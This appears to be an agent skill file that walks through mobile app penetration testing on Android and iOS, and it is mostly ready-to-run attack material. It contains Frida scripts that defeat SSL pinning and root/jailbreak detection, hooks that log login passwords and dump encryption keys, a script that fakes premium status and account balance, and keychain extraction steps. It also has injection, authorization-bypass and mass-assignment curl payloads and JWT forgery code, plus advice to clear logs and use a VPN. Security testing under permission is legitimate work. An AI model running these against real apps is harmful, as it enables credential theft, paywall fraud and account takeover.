---
name: mobile-app-penetration-testing
description: Hack Android/iOS apps (reverse engineering, API interception, bypass root detection)
version: 1.0.0
author: harezadmm
tags: [mobile, android, ios, apk, ipa, frida, burp, mitm]
---

# Mobile App Penetration Testing

## When to Use
Testing security of mobile applications on Android and iOS. Reverse engineering, API interception, bypassing security controls, extracting secrets from apps.

## Prerequisites
- Android/iOS device or emulator
- Rooted Android or jailbroken iOS (for advanced testing)
- Burp Suite or mitmproxy for traffic interception
- Understanding of mobile app architecture
- Java/Kotlin (Android) or Swift/Objective-C (iOS) knowledge

## Attack Vectors

### 1. Static Analysis
Decompile APK/IPA, extract hardcoded secrets, analyze code.

### 2. Dynamic Analysis
Runtime inspection with Frida, hook functions, bypass checks.

### 3. Network Traffic Interception
MITM attack to capture API requests/responses.

### 4. SSL Pinning Bypass
Defeat certificate pinning to intercept HTTPS.

### 5. Root/Jailbreak Detection Bypass
Circumvent security checks for rooted/jailbroken devices.

### 6. Data Storage Analysis
Extract sensitive data from local storage, databases, shared preferences.

## Procedure

### Step 1: Android APK Extraction and Decompilation

**Extract APK from device:**
```bash
# List installed packages
adb shell pm list packages | grep -i target

# Get package path
adb shell pm path com.example.app
# Output: package:/data/app/com.example.app-xxx/base.apk

# Pull APK
adb pull /data/app/com.example.app-xxx/base.apk app.apk

# Or use apkpure.com, apkmirror.com to download APK
```

**Decompile with JADX:**
```bash
# Install JADX
wget https://github.com/skylot/jadx/releases/download/v1.4.7/jadx-1.4.7.zip
unzip jadx-1.4.7.zip
cd jadx-1.4.7

# Decompile APK
./bin/jadx app.apk -d output/

# Open in GUI
./bin/jadx-gui app.apk

# Search for sensitive strings
grep -r "api_key" output/
grep -r "password" output/
grep -r "secret" output/
grep -r "http://" output/
grep -r "https://" output/
```

**Decompile with APKTool (for smali code):**
```bash
# Install apktool
wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool
wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.9.0.jar
mv apktool_2.9.0.jar apktool.jar
chmod +x apktool apktool.jar

# Decompile
apktool d app.apk -o app_decompiled

# Analyze AndroidManifest.xml
cat app_decompiled/AndroidManifest.xml

# Check for exported activities, services
grep -i "exported=\"true\"" app_decompiled/AndroidManifest.xml

# Check permissions
grep "uses-permission" app_decompiled/AndroidManifest.xml

# Recompile after modification
apktool b app_decompiled -o app_modified.apk

# Sign APK
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore app_modified.apk alias_name

# Install
adb install app_modified.apk
```

**Extract strings and secrets:**
```bash
# Extract all strings
strings app.apk > strings.txt

# Search for API keys
grep -E "api[_-]?key|apikey" strings.txt -i
grep -E "secret" strings.txt -i
grep -E "[a-zA-Z0-9]{32,}" strings.txt  # Long hex/base64 strings

# Search for URLs
grep -E "https?://" strings.txt

# Firebase URLs (often contain database name)
grep "firebaseio.com" strings.txt

# AWS keys
grep -E "AKIA[0-9A-Z]{16}" strings.txt
```

### Step 2: iOS IPA Extraction and Analysis

**Extract IPA from device (jailbroken):**
```bash
# SSH into device
ssh root@iphone_ip  # Default password: alpine

# Find app bundle
cd /var/containers/Bundle/Application/
ls -la

# Or use find
find /var/containers/Bundle/Application/ -name "*.app"

# Zip app bundle
cd /path/to/App.app
zip -r app.ipa .

# Transfer to computer
scp -r App.app user@computer:/path/
```

**Decompile IPA:**
```bash
# Unzip IPA
unzip app.ipa -d ipa_extracted

# Extract binary
cd ipa_extracted/Payload/App.app/

# Analyze binary with class-dump (get Objective-C headers)
class-dump App > headers.txt

# Or use Hopper Disassembler (GUI)
# Or Ghidra for deep analysis

# Extract strings
strings App | grep -i "api"
strings App | grep -i "key"
strings App | grep -i "http"

# Check Info.plist
plutil -p Info.plist
```

### Step 3: Traffic Interception (MITM)

**Setup Burp Suite proxy:**
```bash
# Start Burp Suite
# Proxy -> Options -> Proxy Listeners -> Add
# Bind to address: All interfaces
# Port: 8080

# Export CA certificate
# Proxy -> Options -> Import/Export CA Certificate
# Export in DER format
```

**Configure Android device:**
```bash
# Set proxy (WiFi settings)
# Proxy: Manual
# Hostname: <burp_ip>
# Port: 8080

# Install Burp CA certificate
# Transfer cert to device
adb push burp-cert.der /sdcard/burp.cer

# Settings -> Security -> Install from storage
# Select burp.cer

# For Android 7+ (user certificates not trusted by apps)
# Need to install as system certificate or use Magisk module
```

**Install certificate as system cert (rooted):**
```bash
# Convert DER to PEM
openssl x509 -inform DER -in burp-cert.der -out burp-cert.pem

# Get hash for filename
openssl x509 -inform PEM -subject_hash_old -in burp-cert.pem | head -1
# Output: 9a5ba575

# Rename certificate
cat burp-cert.pem > 9a5ba575.0

# Push to system store
adb root
adb remount
adb push 9a5ba575.0 /system/etc/security/cacerts/
adb shell chmod 644 /system/etc/security/cacerts/9a5ba575.0

# Reboot
adb reboot
```

**Configure iOS device:**
```bash
# Set proxy in WiFi settings
# Proxy: Manual
# Server: <burp_ip>
# Port: 8080

# Install Burp CA certificate
# Browse to http://burp in Safari
# Download certificate
# Settings -> Profile Downloaded -> Install

# Trust certificate
# Settings -> General -> About -> Certificate Trust Settings
# Enable full trust for Burp CA
```

### Step 4: SSL Pinning Bypass

**Frida script to bypass SSL pinning (Android):**
```javascript
// ssl-pinning-bypass.js
Java.perform(function() {
    console.log("[*] Bypassing SSL Pinning");
    
    // OkHttp3
    var OkHttpClient = Java.use("okhttp3.OkHttpClient");
    OkHttpClient.certificatePinner.implementation = function() {
        console.log("[+] OkHttp3 pinning bypassed");
        return null;
    };
    
    // TrustManager
    var X509TrustManager = Java.use("javax.net.ssl.X509TrustManager");
    var SSLContext = Java.use("javax.net.ssl.SSLContext");
    
    var TrustManager = Java.registerClass({
        name: "com.android.customtrustmanager",
        implements: [X509TrustManager],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() {
                return [];
            }
        }
    });
    
    var TrustManagers = [TrustManager.$new()];
    var SSLContext_init = SSLContext.init.overload(
        "[Ljavax.net.ssl.KeyManager;",
        "[Ljavax.net.ssl.TrustManager;",
        "java.security.SecureRandom"
    );
    
    SSLContext_init.implementation = function(keyManager, trustManager, secureRandom) {
        console.log("[+] SSLContext.init() bypassed");
        SSLContext_init.call(this, keyManager, TrustManagers, secureRandom);
    };
    
    console.log("[*] SSL Pinning bypass complete");
});
```

**Run Frida script:**
```bash
# Install Frida
pip install frida-tools

# Push frida-server to device
adb root
adb push frida-server-16.0.19-android-arm64 /data/local/tmp/frida-server
adb shell chmod 755 /data/local/tmp/frida-server
adb shell /data/local/tmp/frida-server &

# Run script
frida -U -f com.example.app -l ssl-pinning-bypass.js --no-pause

# Or attach to running process
frida -U com.example.app -l ssl-pinning-bypass.js
```

**Universal SSL pinning bypass (Objection):**
```bash
# Install Objection
pip install objection

# Patch APK with Frida gadget
objection patchapk --source app.apk

# Install patched APK
adb install app-patched.apk

# Run objection
objection -g com.example.app explore

# Inside objection shell
android sslpinning disable

# Hook methods
android hooking watch class com.example.app.MainActivity

# List classes
android hooking list classes

# List methods
android hooking list class_methods com.example.app.api.ApiClient
```

**iOS SSL pinning bypass with SSL Kill Switch:**
```bash
# Install SSL Kill Switch 2 from Cydia (jailbroken device)
# Or use Frida script

# Frida script for iOS
frida -U -f com.example.app -l ios-ssl-bypass.js
```

### Step 5: Root/Jailbreak Detection Bypass

**Bypass root detection (Android):**
```javascript
// root-bypass.js
Java.perform(function() {
    console.log("[*] Bypassing root detection");
    
    // Common root check methods
    var RootBeer = Java.use("com.scottyab.rootbeer.RootBeer");
    RootBeer.isRooted.implementation = function() {
        console.log("[+] Root check bypassed (RootBeer)");
        return false;
    };
    
    // Check for su binary
    var File = Java.use("java.io.File");
    File.exists.implementation = function() {
        var path = this.getAbsolutePath();
        if (path.indexOf("su") > -1 || path.indexOf("magisk") > -1) {
            console.log("[+] Hiding: " + path);
            return false;
        }
        return this.exists.call(this);
    };
    
    // Runtime.exec bypass
    var Runtime = Java.use("java.lang.Runtime");
    Runtime.exec.overload('java.lang.String').implementation = function(cmd) {
        if (cmd.indexOf("su") > -1 || cmd.indexOf("which") > -1) {
            console.log("[+] Blocked command: " + cmd);
            throw new Error("Command not found");
        }
        return this.exec.call(this, cmd);
    };
    
    // Package manager check (for root apps)
    var PackageManager = Java.use("android.app.ApplicationPackageManager");
    PackageManager.getPackageInfo.overload('java.lang.String', 'int').implementation = function(pkg, flags) {
        if (pkg.indexOf("supersu") > -1 || pkg.indexOf("magisk") > -1) {
            console.log("[+] Hiding package: " + pkg);
            throw Java.use("android.content.pm.PackageManager$NameNotFoundException").$new();
        }
        return this.getPackageInfo.call(this, pkg, flags);
    };
    
    console.log("[*] Root bypass complete");
});
```

**Bypass jailbreak detection (iOS):**
```javascript
// jailbreak-bypass.js
if (ObjC.available) {
    console.log("[*] Bypassing jailbreak detection");
    
    // File existence checks
    var NSFileManager = ObjC.classes.NSFileManager;
    var fileExistsAtPath = NSFileManager['- fileExistsAtPath:'];
    
    Interceptor.attach(fileExistsAtPath.implementation, {
        onEnter: function(args) {
            var path = ObjC.Object(args[2]).toString();
            if (path.indexOf("cydia") > -1 || 
                path.indexOf("substrate") > -1 ||
                path.indexOf("jailbreak") > -1) {
                console.log("[+] Hiding path: " + path);
                args[2] = ObjC.classes.NSString.stringWithString_("/fake/path");
            }
        }
    });
    
    // URL scheme checks
    var UIApplication = ObjC.classes.UIApplication;
    var canOpenURL = UIApplication['- canOpenURL:'];
    
    Interceptor.attach(canOpenURL.implementation, {
        onEnter: function(args) {
            var url = ObjC.Object(args[2]).toString();
            if (url.indexOf("cydia://") > -1) {
                console.log("[+] Blocked URL check: " + url);
            }
        },
        onLeave: function(retval) {
            retval.replace(0);
        }
    });
    
    console.log("[*] Jailbreak bypass complete");
}
```

### Step 6: Dynamic Analysis with Frida

**Hook function to log arguments:**
```javascript
// hook-login.js
Java.perform(function() {
    var LoginActivity = Java.use("com.example.app.LoginActivity");
    
    LoginActivity.login.implementation = function(username, password) {
        console.log("[+] Login called");
        console.log("    Username: " + username);
        console.log("    Password: " + password);
        
        // Call original method
        var result = this.login(username, password);
        
        console.log("    Result: " + result);
        return result;
    };
});
```

**Modify return values:**
```javascript
// bypass-premium.js
Java.perform(function() {
    var User = Java.use("com.example.app.models.User");
    
    User.isPremium.implementation = function() {
        console.log("[+] isPremium() called, returning true");
        return true;  // Always premium
    };
    
    User.getBalance.implementation = function() {
        console.log("[+] getBalance() called, returning 999999");
        return 999999;  // Unlimited balance
    };
});
```

**Extract encryption keys:**
```javascript
// extract-keys.js
Java.perform(function() {
    var Cipher = Java.use("javax.crypto.Cipher");
    
    Cipher.init.overload('int', 'java.security.Key').implementation = function(mode, key) {
        console.log("[+] Cipher.init() called");
        
        // Extract key
        var keyBytes = key.getEncoded();
        var keyHex = "";
        for (var i = 0; i < keyBytes.length; i++) {
            keyHex += ("0" + (keyBytes[i] & 0xFF).toString(16)).slice(-2);
        }
        
        console.log("    Key: " + keyHex);
        console.log("    Algorithm: " + key.getAlgorithm());
        
        return this.init(mode, key);
    };
});
```

### Step 7: Data Storage Analysis

**Analyze SharedPreferences (Android):**
```bash
# Root required
adb shell
cd /data/data/com.example.app/shared_prefs/
cat *.xml

# Look for sensitive data
grep -i "password\|token\|secret\|api" *.xml

# Pull to computer
adb pull /data/data/com.example.app/shared_prefs/ prefs/
```

**Analyze SQLite databases:**
```bash
# Pull database
adb pull /data/data/com.example.app/databases/app.db

# Open in sqlite3
sqlite3 app.db

# List tables
.tables

# Dump table
SELECT * FROM users;

# Search for sensitive data
SELECT * FROM users WHERE username LIKE '%admin%';
```

**Analyze internal storage:**
```bash
# List files
adb shell ls -la /data/data/com.example.app/files/

# Pull all data
adb pull /data/data/com.example.app/ app_data/

# Search for secrets
grep -r "password\|token\|api_key" app_data/
```

**iOS Keychain extraction (jailbroken):**
```bash
# Install Keychain-Dumper
git clone https://github.com/ptoomey3/Keychain-Dumper
cd Keychain-Dumper
scp keychain_dumper root@iphone_ip:/tmp/

# Run on device
ssh root@iphone_ip
cd /tmp
./keychain_dumper > keychain.txt

# Download results
scp root@iphone_ip:/tmp/keychain.txt .

# View keychain items
cat keychain.txt
```

### Step 8: API Security Testing

**Capture and replay API requests:**
```bash
# In Burp, right-click request -> Copy as curl
curl 'https://api.example.com/user/profile' \
  -H 'Authorization: Bearer eyJhbGc...' \
  -H 'User-Agent: MyApp/1.0' \
  -H 'Content-Type: application/json'

# Test for injection
curl 'https://api.example.com/search?q=test%27%20OR%201=1--' \
  -H 'Authorization: Bearer eyJhbGc...'

# Test authorization bypass
curl 'https://api.example.com/admin/users' \
  -H 'Authorization: Bearer user_token'

# Mass assignment vulnerability
curl 'https://api.example.com/user/profile' \
  -X PUT \
  -H 'Authorization: Bearer token' \
  -d '{"name":"hacker","role":"admin","isPremium":true}'
```

**Test JWT vulnerabilities:**
```python
import jwt
import base64

# Captured JWT token
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJ1c2VyIn0.signature"

# Decode without verification
decoded = jwt.decode(token, options={"verify_signature": False})
print(decoded)
# {'user': 'john', 'role': 'user'}

# None algorithm attack
header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip('=')
payload = base64.urlsafe_b64encode(b'{"user":"john","role":"admin"}').decode().rstrip('=')
forged = f"{header}.{payload}."

# Weak secret brute force
import hashlib
wordlist = ['secret', 'password', '123456', 'admin']
for word in wordlist:
    try:
        jwt.decode(token, word, algorithms=['HS256'])
        print(f"[+] Found secret: {word}")
        break
    except:
        pass
```

### Step 9: Automated Mobile App Scanning

**MobSF (Mobile Security Framework):**
```bash
# Install Docker
docker pull opensecurity/mobile-security-framework-mobsf

# Run MobSF
docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf

# Access at http://localhost:8000
# Upload APK/IPA for automated analysis
```

**QARK (Quick Android Review Kit):**
```bash
# Install QARK
pip install qark

# Scan APK
qark --apk app.apk --report-type html

# View report
open qark_report.html
```

## Pitfalls

**Certificate pinning**: Hard to bypass without root/jailbreak and Frida.

**Obfuscation**: ProGuard/R8 (Android) and code obfuscation make reverse engineering harder.

**Anti-debugging**: Apps detect debuggers and refuse to run.

**SafetyNet/Play Integrity**: Google's device attestation detects rooted devices.

**App encryption**: Some apps encrypt their code or use native libraries.

## Verification

```bash
# Verify proxy interception
# Should see HTTP/HTTPS requests in Burp

# Verify SSL pinning bypass
# Should intercept HTTPS traffic from pinned app

# Verify root bypass
# App should run normally on rooted device

# Verify Frida hooks working
frida -U com.example.app -l script.js
# Should see console.log output
```

## OPSEC

- Test on personal devices or with permission
- Don't distribute modified APKs
- Use VPN when testing production APIs
- Respect rate limits
- Clear logs after testing
- Don't submit pentest findings to app stores

## References

- OWASP Mobile Security Testing Guide (MSTG)
- OWASP Mobile Top 10
- Frida documentation
- Objection documentation
- Android Security Internals
- iOS Application Security
